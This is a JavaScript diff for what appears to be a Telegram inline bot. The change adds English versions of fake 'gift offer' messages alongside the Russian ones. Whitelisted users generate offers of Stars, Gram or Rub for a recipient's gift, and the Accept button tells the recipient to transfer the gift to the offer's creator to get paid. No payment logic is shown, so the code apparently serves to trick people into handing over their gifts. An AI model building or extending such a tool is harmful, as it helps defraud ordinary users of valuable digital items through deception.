@@ -8,7 +8,7 @@ const ALLOWED_IDS = [
   883619484, 
   7903610791,
   8614618729,
-  8532075411
+  8532075411 // Твой новый ID добавлен
 ];
 const ALLOWED_USERNAMES = ["nogannopervi"];
 
@@ -57,6 +57,14 @@ export default {
 
         let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
         
+        // ОПРЕДЕЛЯЕМ ЯЗЫК (если есть "eng" - английский, иначе русский)
+        let lang = "ru";
+        if (textQuery.includes("eng") || textQuery.includes("en ")) {
+            lang = "en";
+            // Убираем "eng" из текста, чтобы он не мешал поиску цифр
+            textQuery = textQuery.replace(/eng/g, '').trim();
+        }
+
         const allNums = textQuery.match(/\d+/g); 
         const amount = allNums ? allNums[allNums.length - 1] : "0"; 
         
@@ -71,7 +79,7 @@ export default {
             }
         }
 
-        // ОПРЕДЕЛЯЕМ ВАЛЮТУ (Stars, Gram или Rub)
+        // ОПРЕДЕЛЯЕМ ВАЛЮТУ
         let currencyType = "stars";
         let currencyDisplay = "⭐ Stars";
         
@@ -89,18 +97,24 @@ export default {
 
         const sellerUsername = iq.from.username ? iq.from.username.toLowerCase() : "gwrex";
         
-        const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currencyDisplay} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
+        // ГЕНЕРИРУЕМ ТЕКСТ НА ВЫБРАННОМ ЯЗЫКЕ
+        let text = "";
+        if (lang === "en") {
+            text = `🎁 <b>Gift Offer</b>\n\n👤 <b>${senderName}</b> offers you ${amount} ${currencyDisplay} for this gift.\n\n${giftLink}\n\n⏳ The offer is valid for 5 hours 59 minutes.`;
+        } else {
+            text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currencyDisplay} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
+        }
 
         const results = [{
           type: "article",
           id: "1",
-          title: `Оффер от ${senderName}`,
-          description: `За ${amount} ${currencyDisplay}`,
+          title: lang === "en" ? `Offer from ${senderName}` : `Оффер от ${senderName}`,
+          description: lang === "en" ? `For ${amount} ${currencyDisplay}` : `За ${amount} ${currencyDisplay}`,
           input_message_content: { message_text: text, parse_mode: "HTML" },
           reply_markup: {
             inline_keyboard: [
-              [{ text: "✅ Принять", callback_data: `acc|${amount}|${currencyType}|${sellerUsername}|${giftLink}` }],
-              [{ text: "❌ Отклонить", callback_data: `dec|${amount}|${currencyType}` }]
+              [{ text: lang === "en" ? "✅ Accept" : "✅ Принять", callback_data: `acc|${amount}|${currencyType}|${sellerUsername}|${giftLink}|${lang}` }],
+              [{ text: lang === "en" ? "❌ Decline" : "❌ Отклонить", callback_data: `dec|${amount}|${currencyType}|${lang}` }]
             ]
           }
         }];
@@ -150,7 +164,14 @@ export default {
           const sellerUsername = dataParts[3] || "gwrex"; 
           const giftLink = dataParts[4] || ""; 
           
-          // ОПРЕДЕЛЯЕМ ОТОБРАЖЕНИЕ ВАЛЮТЫ ПРИ ПРИНЯТИИ
+          // Определяем язык (по умолчанию ru)
+          let lang = "ru";
+          if (dataParts[0] === "acc") {
+              lang = dataParts[5] || "ru";
+          } else {
+              lang = dataParts[3] || "ru";
+          }
+          
           let displayCurrency = "⭐ Stars";
           if (currencyType === "gram") displayCurrency = "💎 Gram";
           if (currencyType === "rub") displayCurrency = "₽ Rub";
@@ -165,20 +186,24 @@ export default {
           if (action === "acc") {
             await callApi("answerCallbackQuery", { 
               callback_query_id: cq.id, 
-              text: `Оффер принят ✅\n\nНажмите "Передать подарок", чтобы открыть его`, 
+              text: lang === "en" ? `Offer accepted ✅\n\nClick "Gift" to open it` : `Оффер принят ✅\n\nНажмите "Передать подарок", чтобы открыть его`, 
               show_alert: true 
             }, BOT_TOKEN);
             
-            newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок продавцу (@${sellerUsername}).`;
-            
-            let finalUrl = giftLink ? giftLink : ("https://t.me/" + sellerUsername);
-            
-            newMarkup = { 
-              inline_keyboard: [[{ text: "🎁 Передать подарок", url: finalUrl }]] 
-            };
+            if (lang === "en") {
+                newText = `✅ <b>Offer accepted!</b>\n\nBuyer: <b>${buyerName}</b>\n\nTo receive ${amount} ${displayCurrency}, send the gift to seller (@${sellerUsername}).`;
+                newMarkup = { 
+                  inline_keyboard: [[{ text: "🎁 Send Gift", url: giftLink || ("https://t.me/" + sellerUsername) }]] 
+                };
+            } else {
+                newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок продавцу (@${sellerUsername}).`;
+                newMarkup = { 
+                  inline_keyboard: [[{ text: "🎁 Передать подарок", url: giftLink || ("https://t.me/" + sellerUsername) }]] 
+                };
+            }
           } else {
             await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
-            newText = `❌ <b>Вы отказались от оффера.</b>`;
+            newText = lang === "en" ? `❌ <b>You declined the offer.</b>` : `❌ <b>Вы отказались от оффера.</b>`;
           }
 
           if (cq.inline_message_id) {
